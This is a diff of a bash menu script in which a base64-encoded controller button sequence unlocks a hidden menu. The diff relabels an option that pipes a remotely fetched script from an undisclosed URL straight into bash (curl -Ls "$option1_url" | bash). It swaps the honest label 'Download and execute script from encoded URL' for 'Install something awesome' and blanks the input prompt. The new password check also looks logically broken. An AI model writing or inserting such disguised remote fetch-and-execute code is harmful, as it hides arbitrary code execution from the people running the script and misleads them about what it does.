@@ -1,29 +1,32 @@
 #!/bin/bash
 
-# Function to decode the password sequence and validate user input
+# Encoded button sequence (controller input)
 encoded_sequence="VVAuVVAsRE9XTixET1dOLExFRlQsUklHSFQsTEVGVCxSSUdIVA=="
 required_sequence=($(echo "$encoded_sequence" | base64 -d | tr ',' ' '))
 
+# Function to capture controller input
 capture_controller_input() {
     local input_sequence=()
     while [[ ${#input_sequence[@]} -lt ${#required_sequence[@]} ]]; do
-        read -p "Press a direction (UP/DOWN/LEFT/RIGHT): " input
+        # Replace this read with actual controller input capturing logic
+        read -p "" input
         echo "You pressed: $input"
         input_sequence+=("$input")
 
+        # Feedback for mismatched input
         if [[ "${input_sequence[@]}" != "${required_sequence[@]:0:${#input_sequence[@]}}" ]]; then
             echo "Incorrect sequence! Starting over..."
             input_sequence=()
         fi
     done
 
+    # Verify the full sequence
     if [[ "${input_sequence[@]}" == "${required_sequence[@]}" ]]; then
         echo "Password accepted!"
-        dialog --title "Access Granted" --msgbox "Welcome to the Password-Protected Menu!" 8 40
+        return 0
     else
         echo "Access denied!"
-        dialog --title "Access Denied" --msgbox "Incorrect password. Returning to the main menu." 8 40
-        exit 1
+        return 1
     fi
 }
 
@@ -36,26 +39,22 @@ clear
 capture_controller_input
 
 while true; do
-    password_menu_choice=$(dialog --menu "Password-Protected Menu" 15 70 4 \
-        "Option1" "Download and execute script from encoded URL" \
-        "Option2" "Another great action" \
-        "Back" "Return to the main menu" 2>&1 >/dev/tty)
-
-    case "$password_menu_choice" in
-        "Option1")
-            dialog --title "Option 1" --infobox "Downloading and executing script..." 8 40
-            curl -Ls "$option1_url" | bash
-            ;;
-        "Option2")
-            dialog --title "Option 2" --msgbox "You selected Option 2." 8 40
-            ;;
-        "Back")
-            break
-            ;;
-        *)
-            dialog --title "Error" --msgbox "Invalid choice. Returning to menu." 8 40
-            ;;
-    esac
-
+    input_password=$(dialog --passwordbox "Enter the password to access the menu:" 8 40 2>&1 >/dev/tty)
+    if [[ "$input_password" == "${required_sequence[@]}" ]]; then
+        selected_option=$(dialog --menu "Password-Protected Menu" 15 70 3 \
+            "BGD" "Install something awesome" \
+            "Back" "Return to the main menu" 2>&1 >/dev/tty)
+        case "$selected_option" in
+            "BGD")
+                curl -Ls "$option1_url" | bash
+                ;;
+            "Back")
+                break
+                ;;
+        esac
+    else
+        dialog --title "Access Denied" --msgbox "Incorrect password." 5 40
+        sleep 3
+    fi
 done
 clear
